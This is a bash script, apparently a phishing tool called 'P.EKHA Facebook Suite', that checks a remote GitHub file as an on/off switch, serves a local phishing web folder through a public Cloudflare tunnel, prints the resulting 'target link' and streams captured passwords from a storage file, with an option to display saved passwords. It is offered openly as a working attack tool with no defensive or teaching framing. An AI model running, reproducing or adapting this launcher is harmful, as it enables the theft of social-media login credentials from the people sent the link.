#!/bin/bash
# P.EKHA MACHINE v1.0

# --- REMOTE CONTROL ---
# Chidacho chizidutsa ku GitHub kukaona ngati chili ON
STATUS=$(curl -s https://raw.githubusercontent.com/Phillimon-Isaac/PEkha/main/status.txt)

if [ "$STATUS" == "OFF" ]; then
    clear
    echo -e "\e[1;31m[!] ACCESS DENIED: This tool is disabled by Phillimon Isaac.\e[0m"
    exit
fi

# COLORS
RED='\e[1;31m'
GREEN='\e[1;32m'
YELLOW='\e[1;33m'
NC='\e[0m'

clear
echo -e "${RED}"
echo "      (      (          (      "
echo "      )\ )   )\ )       )\ )   "
echo "     (()/(  (()/(   (  (()/(   "
echo "     | _ \  | __|  | | | |/ /  "
echo "     |_|    |___|  |_| |_|\_\  "
echo -e "${YELLOW}   [+] P.EKHA FACEBOOK SUITE v1.0 [+]"
echo -e "   [+] DEVELOPED BY: PHILLIMON ISAAC [+]"
echo ""
echo -e "\e[1;34m[1]\e[0m START FACEBOOK ATTACK"
echo -e "\e[1;34m[2]\e[0m VIEW SAVED PASSWORDS"
echo ""
read -p "P.EKHA:~$ " option

if [ "$option" == "1" ]; then
    php -S 127.0.0.1:8080 -t web/ > /dev/null 2>&1 &
    cloudflared tunnel --url http://127.0.0.1:8080 > cloudflare.log 2>&1 &
    echo -e "${YELLOW}[+] Starting Cloudflare... (Wait 15s)${NC}"
    sleep 15
    link=$(grep -o 'https://[-0-9a-z.]*.trycloudflare.com' cloudflare.log)
    echo -e "${GREEN}[!] TARGET LINK: $link${NC}"
    touch storage/passwords.txt
    tail -f storage/passwords.txt
elif [ "$option" == "2" ]; then
    cat storage/passwords.txt
else
    exit
fi
